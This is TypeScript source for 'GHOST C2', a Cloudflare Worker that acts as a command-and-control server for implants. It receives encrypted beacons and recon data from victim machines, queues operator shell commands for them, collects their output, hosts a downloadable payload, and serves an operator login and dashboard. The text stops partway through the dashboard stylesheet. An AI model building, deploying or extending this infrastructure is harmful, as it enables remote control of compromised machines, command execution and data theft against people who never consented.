/**
 * GHOST C2 — Cloudflare Worker
 *
 * - URL‑decodes session IDs (fixes pipe issue).
 * - Hostname‑derived AES‑GCM (no PSK).
 * - Results kept by default; ?clear=1 removes.
 * - KV operations retried with exponential backoff.
 * - Safe JSON parsing — never throws on malformed bodies.
 * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
 */

// ─── Environment ──────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  /** Dashboard login username */
  DASHBOARD_USER: string;
  /** Dashboard login password */
  DASHBOARD_PASS: string;
  /** Seconds before an idle session expires. Default: 600. */
  SESSION_TIMEOUT_SECONDS: string;
  /** Allowed CORS origin. Default: * */
  CORS_ORIGIN: string;
}

// ─── Domain Types ─────────────────────────────────────────

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session?: string;
  enc?: string;          // encrypted JSON payload
}

interface ResultRequest {
  session?: string;
  enc?: string;          // encrypted output
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Constants ────────────────────────────────────────────

const MAX_SESSION_LEN = 128;
const MAX_CMD_LEN = 4096;
const MAX_OUTPUT_LEN = 65_536;
const RESULT_CAP = 500;
const RESULT_BYTE_CAP = 20 * 1024 * 1024; // 20 MB
const AUDIT_CAP = 1_000;
const AUDIT_TTL = 604_800; // 7 days
const TASK_TTL = 86_400;   // 24 hours
const PAYLOAD_MAX = 32 * 1024 * 1024; // 32 MB
const PAYLOAD_TTL = 86_400 * 30;

const KV_MAX_RETRIES = 3;
const KV_RETRY_BASE_MS = 200;

// ─── Rate Limiter (in-memory, per-IP, per-Worker-instance) ──
// Cloudflare Workers are stateless across instances but this protects
// against burst attacks within a single instance lifetime.
const RL_WINDOW_MS = 60_000;   // 1 minute window
const RL_AUTH_MAX = 5;        // max 5 login attempts per minute per IP
const RL_API_MAX = 120;      // max 120 API calls per minute per IP

const _rlBuckets = new Map<string, { count: number; reset: number }>();

function rateLimitHit(key: string, max: number): boolean {
  const now = Date.now();
  let bucket = _rlBuckets.get(key);
  if (!bucket || now > bucket.reset) {
    bucket = { count: 0, reset: now + RL_WINDOW_MS };
    _rlBuckets.set(key, bucket);
  }
  bucket.count++;
  // Prune old keys occasionally to avoid memory leak
  if (_rlBuckets.size > 10_000) {
    for (const [k, v] of _rlBuckets) { if (now > v.reset) _rlBuckets.delete(k); }
  }
  return bucket.count > max;
}

function rateLimitResponse(): Response {
  return new Response(JSON.stringify({ error: "Too many requests" }), {
    status: 429,
    headers: { "Content-Type": "application/json", "Retry-After": "60" },
  });
}

// ─── Crypto Helpers ───────────────────────────────────────

/**
 * Derive a 32‑byte AES key from the session ID using SHA‑256.
 * Both implant and Worker compute the same key from the same session ID.
 */
async function deriveKey(sid: string): Promise<Uint8Array> {
  const encoder = new TextEncoder();
  const data = encoder.encode(sid);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return new Uint8Array(hash);
}

async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
  if (data.length < 28) throw new Error("Ciphertext too short");
  const iv = data.slice(0, 12);
  const tag = data.slice(12, 28);
  const ct = data.slice(28);

  const ctWithTag = new Uint8Array(ct.length + tag.length);
  ctWithTag.set(ct, 0);
  ctWithTag.set(tag, ct.length);

  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
  return new TextDecoder().decode(decrypted);
}

async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));

  const buf = new Uint8Array(encrypted);
  const ct = buf.slice(0, buf.length - 16);
  const tag = buf.slice(buf.length - 16);

  const out = new Uint8Array(12 + 16 + ct.length);
  out.set(iv, 0);
  out.set(tag, 12);
  out.set(ct, 28);

  return btoa(String.fromCharCode(...out));
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const enc = new TextEncoder();
  const bufA = enc.encode(a);
  const bufB = enc.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) diff |= bufA[i] ^ bufB[i];
  return diff === 0;
}

function getClientIP(request: Request): string {
  return (
    request.headers.get("CF-Connecting-IP") ??
    request.headers.get("X-Real-IP") ??
    "unknown"
  );
}

function clamp(s: string, max: number): string {
  return s.length > max ? s.slice(0, max) : s;
}

function getSessionTTL(env: Env): number {
  const v = parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
  return Number.isFinite(v) && v > 0 ? v : 600;
}

function now(): string {
  return new Date().toISOString();
}

async function safeJson<T>(request: Request): Promise<T | null> {
  try {
    return (await request.json()) as T;
  } catch {
    return null;
  }
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const h = new Headers(response.headers);
  h.set("Access-Control-Allow-Origin", origin);
  h.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  h.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  h.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: h,
  });
}

// ─── KV: Retry Wrapper ────────────────────────────────────

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastErr: Error | undefined;
  for (let attempt = 0; attempt < KV_MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastErr = err as Error;
      if (attempt < KV_MAX_RETRIES - 1) {
        await new Promise(r => setTimeout(r, KV_RETRY_BASE_MS * (attempt + 1)));
      }
    }
  }
  throw lastErr ?? new Error("KV operation failed after retries");
}

// ─── KV: Session ──────────────────────────────────────────

function sessionKey(sid: string): string { return `session:${sid}`; }
function tasksKey(sid: string): string { return `tasks:${sid}`; }
function resultsKey(sid: string): string { return `results:${sid}`; }

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(sessionKey(sid));
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(
  kv: KVNamespace,
  sid: string,
  data: SessionData,
  ttl: number,
): Promise<void> {
  await withRetry(() =>
    kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: ttl }),
  );
}

// ─── KV: Tasks ────────────────────────────────────────────

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(tasksKey(sid));
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(
  kv: KVNamespace,
  sid: string,
  tasks: string[],
  sessionTtl = TASK_TTL,
): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(tasksKey(sid));
    } else {
      await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
    }
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Results ──────────────────────────────────────────

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(resultsKey(sid));
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(() => {
    if (results.length === 0) return kv.delete(resultsKey(sid));
    return kv.put(resultsKey(sid), JSON.stringify(results), { expirationTtl: TASK_TTL });
  });
}

async function appendResult(
  kv: KVNamespace,
  sid: string,
  entry: ResultEntry,
  sessionTtl: number,
): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);
    while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
      results.shift();
    }
    await putResults(kv, sid, results);
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const k of result.keys) keys.push(k.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const raw = await kv.get("audit_log");
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= AUDIT_CAP) log.splice(0, log.length - (AUDIT_CAP - 1));
    log.push(entry);
    await kv.put("audit_log", JSON.stringify(log), { expirationTtl: AUDIT_TTL });
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") ?? "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") ?? "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<BeaconRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ts = now();
  const ip = getClientIP(request);
  const ttl = getSessionTTL(env);

  // Derive AES key from session ID
  const keyBytes = await deriveKey(sid);

  let recon: Record<string, unknown> = {};
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      recon = parsed.recon ?? {};
    } catch (e) {
      console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    // Fallback for plaintext (if implant sends without encryption)
    recon = body.recon ?? {};
  }

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? ts,
    last_beacon: ts,
    recon: recon,
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  let cmd = "sleep";
  if (tasks.length > 0) {
    cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks, ttl);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
  } else {
    console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  }

  // log every beacon so audit shows activity
  await logAudit(env.GHOST_KV, { ts, action: "beacon", ip, detail: { sid } });

  const plainResponse = JSON.stringify({ cmd });
  const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
  return jsonResponse({ enc: encryptedResponse });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<ResultRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ttl = getSessionTTL(env);
  const keyBytes = await deriveKey(sid);

  let output = "";
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      output = parsed.output ?? "";
    } catch (e) {
      console.error(`[result] sid=${sid} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    output = body.output ?? "";
  }

  const trimmed = clamp(output, MAX_OUTPUT_LEN);
  await appendResult(env.GHOST_KV, sid, { ts: now(), output: trimmed }, ttl);

  // If session doesn't exist, create it (shouldn't happen, but safe)
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const ts = now();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: ts,
      last_beacon: ts,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, ttl);
  }

  console.log(`[result] sid=${sid} len=${trimmed.length}`);
  return jsonResponse({ status: "ok" });
}

async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const ts = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;
    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((ts - new Date(data.last_beacon).getTime()) / 1000),
      recon: data.recon,
      pending_tasks: data.pending_tasks ?? 0,
      result_count: data.result_count ?? 0,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<TaskRequest>(request);
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const cmd = clamp(String(body.cmd), MAX_CMD_LEN);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  // sid is already decoded by router
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const results = await getResults(env.GHOST_KV, sid);
  const clear = new URL(request.url).searchParams.get("clear") === "1";
  if (clear) await putResults(env.GHOST_KV, sid, []);

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, clear },
  });

  return jsonResponse({ session: sid, results });
}

async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

async function handleAudit(request: Request, env: Env): Promise<Response> {
  const limit = Math.min(
    parseInt(new URL(request.url).searchParams.get("limit") ?? "100", 10),
    AUDIT_CAP,
  );
  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
  return jsonResponse({ entries: log.slice(-limit) });
}

function handleHealth(): Response {
  return jsonResponse({ status: "ok", ts: now() });
}

async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
  const body = await request.arrayBuffer();
  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
  if (body.byteLength > PAYLOAD_MAX) return errorResponse("Payload too large (max 32 MB)", 413);

  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: PAYLOAD_TTL });
  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "payload_uploaded",
    detail: { bytes: body.byteLength },
  });

  console.log(`[payload] uploaded ${body.byteLength} bytes`);
  return jsonResponse({ status: "ok", bytes: body.byteLength });
}

async function handleDownloadPayload(env: Env): Promise<Response> {
  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
  if (!raw) return errorResponse("Payload not found", 404);
  return new Response(raw, {
    status: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": String(raw.byteLength),
      "Cache-Control": "no-store",
    },
  });
}

// ─── Dashboard HTML ───────────────────────────────────────

const LOGIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST // AUTH</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080a0e;--surface:#0d1117;--border:#1a2030;--accent:#00ff88;
  --accent-dim:#00ff8833;--red:#ff3b5c;--yellow:#f0c040;
  --text:#c9d1d9;--muted:#484f58;--mono:'JetBrains Mono','Fira Code',monospace;
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono),monospace}
body{display:flex;align-items:center;justify-content:center;min-height:100dvh;position:relative;overflow:hidden}
.scanline{position:fixed;inset:0;pointer-events:none;z-index:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.015) 2px,rgba(0,255,136,0.015) 4px)}
.grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
  background-size:40px 40px;opacity:.4}
.panel{position:relative;z-index:1;width:360px;border:1px solid var(--border);background:var(--surface);padding:40px 36px}
.panel::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
.logo{font-size:11px;letter-spacing:.3em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
.title{font-size:22px;font-weight:700;letter-spacing:.08em;color:var(--accent);margin-bottom:4px;text-shadow:0 0 20px rgba(0,255,136,.4)}
.subtitle{font-size:10px;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;margin-bottom:32px}
.field{margin-bottom:16px}
.field label{display:block;font-size:10px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
.field input{width:100%;background:#0a0d14;border:1px solid var(--border);color:var(--text);padding:10px 12px;
  font-family:var(--mono);font-size:13px;outline:none;transition:border-color .2s}
.field input:focus{border-color:var(--accent)}
.field input::placeholder{color:var(--muted)}
.btn{width:100%;background:transparent;border:1px solid var(--accent);color:var(--accent);padding:11px;
  font-family:var(--mono);font-size:12px;letter-spacing:.15em;text-transform:uppercase;cursor:pointer;
  transition:background .15s,box-shadow .15s;margin-top:8px}
.btn:hover{background:var(--accent-dim);box-shadow:0 0 16px rgba(0,255,136,.2)}
.btn:active{transform:scale(.99)}
.err{font-size:11px;color:var(--red);letter-spacing:.05em;margin-top:16px;padding:8px;border:1px solid rgba(255,59,92,.2);background:rgba(255,59,92,.05);display:none}
.err.show{display:block}
.corner{position:absolute;width:8px;height:8px;border-color:var(--accent);border-style:solid;opacity:.6}
.corner.tl{top:-1px;left:-1px;border-width:1px 0 0 1px}
.corner.tr{top:-1px;right:-1px;border-width:1px 1px 0 0}
.corner.bl{bottom:-1px;left:-1px;border-width:0 0 1px 1px}
.corner.br{bottom:-1px;right:-1px;border-width:0 1px 1px 0}
</style>
</head>
<body>
<div class="grid-bg"></div>
<div class="scanline"></div>
<div class="panel">
  <div class="corner tl"></div><div class="corner tr"></div>
  <div class="corner bl"></div><div class="corner br"></div>
  <div class="logo">GHOST FRAMEWORK</div>
  <div class="title">C2 CONSOLE</div>
  <div class="subtitle">Operator Authentication Required</div>
  <form id="f" onsubmit="login(event)">
    <div class="field">
      <label>Username</label>
      <input id="u" type="text" placeholder="operator" autocomplete="username" required>
    </div>
    <div class="field">
      <label>Password</label>
      <input id="p" type="password" placeholder="••••••••••••" autocomplete="current-password" required>
    </div>
    <button class="btn" type="submit">[ AUTHENTICATE ]</button>
  </form>
  <div class="err" id="err">ACCESS DENIED — invalid credentials</div>
</div>
<script>
async function login(e) {
  e.preventDefault();
  const btn = document.querySelector('.btn');
  btn.textContent = '[ AUTHENTICATING... ]';
  btn.disabled = true;
  const r = await fetch('/auth', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
  });
  if (r.ok) {
    const {token} = await r.json();
    sessionStorage.setItem('ghost_token', token);
    location.href = '/dashboard';
  } else {
    document.getElementById('err').classList.add('show');
    btn.textContent = '[ AUTHENTICATE ]';
    btn.disabled = false;
  }
}
</script>
</body>
</html>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2 // CONSOLE</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#060810;--surface:#0b0e18;--surface2:#0f1420;--surface3:#131824;
  --border:#1c2436;--border2:#243040;
  --accent:#00ff88;--accent-dim:#00ff8818;--accent-glow:rgba(0,255,136,.3);
  --red:#ff3b5c;--red-dim:rgba(255,59,92,.15);
  --yellow:#f0c040;--blue:#4fc3f7;--orange:#ff8c42;--purple:#c678dd;
  --text:#cdd6f4;--text2:#a6adc8;--muted:#585b70;--muted2:#2a2d3e;
  --hi:#00ff88;
  --mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:12px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:radial-gradient(ellipse 80% 50% at 50% -20%,rgba(0,255,136,.04),transparent)}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.06) 3px,rgba(0,0,0,0.06) 4px)}

/* ── HEADER ───────────────────────────────────────────── */
header{height:42px;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;position:relative;z-index:10}
header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,var(--accent) 30%,var(--accent) 70%,transparent 100%);opacity:.25}
.hdr-logo{padding:0 18px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%;flex-shrink:0}
.hdr-logo .ghost{font-size:14px;font-weight:700;letter-spacing:.12em;color:var(--accent);text-shadow:0 0 16px var(--accent-glow)}
.hdr-logo .ver{font-size:9px;letter-spacing:.15em;color:var(--muted);padding:2px 5px;border:1px solid var(--border)}
.hdr-seg{padding:0 14px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%;flex-shrink:0}
.pulse{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background .3s,box-shadow .3s}
.pulse.live{background:var(--accent);box-shadow:0 0 10px var(--accent-glow);animation:blink 2s ease-in-out infinite}
.pulse.warn{background:var(--yellow);box-shadow:0 0 8px rgba(240,192,64,.5)}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}
.status-txt{font-size:10px;letter-spacing:.12em;color:var(--muted);text-transform:uppercase}
.status-txt.live{color:var(--accent)}
.hdr-kv{display:flex;flex-direction:column;justify-content:center}
.hdr-kv .k{font-size:8px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase}
.hdr-kv .v{font-size:11px;color:var(--text);letter-spacing:.04em}
.hdr-right{margin-left:auto;padding:0 14px;display:flex;align-items:center;gap:10px}
#clock{font-size:10px;color:var(--muted);letter-spacing:.06em;font-variant-numeric:tabular-nums}
.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:4px 12px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
.hdr-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
.hdr-btn.danger:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}

/* ── LAYOUT ───────────────────────────────────────────── */
.workspace{display:flex;flex:1;height:calc(100dvh - 42px);overflow:hidden;position:relative;z-index:1}

/* ── SIDEBAR ──────────────────────────────────────────── */
#sidebar{width:230px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
.pane-head{padding:7px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2);flex-shrink:0}
.pane-label{font-size:9px;letter-spacing:.2em;color:var(--muted);text-transform:uppercase}
.pane-count{font-size:9px;color:var(--accent);letter-spacing:.05em}
.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:12px;padding:0 4px;line-height:1;transition:color .15s}
.icon-btn:hover{color:var(--accent)}
#session-list{flex:1;overflow-y:auto}
.no-sessions{padding:24px 14px;color:var(--muted);font-size:10px;letter-spacing:.06em;text-align:center}
.no-sessions::before{content:'[ ]';display:block;font-size:20px;opacity:.2;margin-bottom:8px}
.session-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s;position:relative;overflow:hidden}
.session-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:transparent;transition:background .15s}
.session-item:hover{background:var(--surface2)}
.session-item.active{background:#0a1a10}
.session-item.active::before{background:var(--accent)}
.sid{font-size:10px;font-weight:700;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.04em;margin-bottom:3px}
.smeta{color:var(--muted);font-size:9px;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.02em}
.smeta .elevated{color:var(--yellow);font-weight:700}
.sbadge{display:inline-flex;align-items:center;gap:4px;margin-top:6px;padding:2px 7px;font-size:8px;letter-spacing:.1em;text-transform:uppercase;border:1px solid}
.sbadge.live{border-color:rgba(0,255,136,.25);color:var(--accent);background:rgba(0,255,136,.05)}
.sbadge.tasks{border-color:rgba(240,192,64,.25);color:var(--yellow);background:rgba(240,192,64,.05)}
.sbadge.stale{border-color:rgba(255,59,92,.25);color:var(--red);background:var(--red-dim)}
.sbadge-dot{width:4px;height:4px;border-radius:50%;background:currentColor}

/* ── MAIN CONTENT ─────────────────────────────────────── */
#main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}

/* tab bar */
#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;height:34px}
.tab{padding:0 16px;height:100%;display:flex;align-items:center;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:6px;white-space:nowrap}
.tab:hover{color:var(--text2)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-count{background:var(--surface2);padding:1px 5px;font-size:8px;border-radius:2px;color:var(--muted)}
.tab.active .tab-count{background:rgba(0,255,136,.15);color:var(--accent)}

/* session sub-header */
#session-header{padding:6px 14px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:10px;flex-wrap:wrap;flex-shrink:0}
.sel-sid{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.05em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:260px}
.sel-meta{font-size:9px;color:var(--muted);flex:1;letter-spacing:.04em;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sel-actions{display:flex;align-items:center;gap:6px;flex-shrink:0}
#last-poll{font-size:9px;letter-spacing:.06em;color:var(--muted);transition:color .3s}
.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 9px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
.act-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
.act-btn.kill:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}

/* empty state */
#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--muted)}
.empty-glyph{font-size:32px;opacity:.15;letter-spacing:.3em}
.empty-msg{font-size:10px;letter-spacing:.2em;text-transform:uppercase;opacity:.4}
.empty-hint{font-size:9px;color:var(--muted);opacity:.3;letter-spacing:.08em}

/* output pane — terminal log */
#output-pane{flex:1;overflow-y:auto;padding:0;display:flex;flex-direction:column;display:none;background:var(--bg)}
#recon-pane{flex:1;overflow-y:auto;padding:14px;display:none;background:var(--bg)}

/* result entries — terminal style */
.result-entry{border-bottom:1px solid var(--border);overflow:hidden}
.result-entry:last-child{border-bottom:none}
.result-hdr{padding:4px 12px;background:var(--surface2);color:var(--muted);font-size:9px;letter-spacing:.08em;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
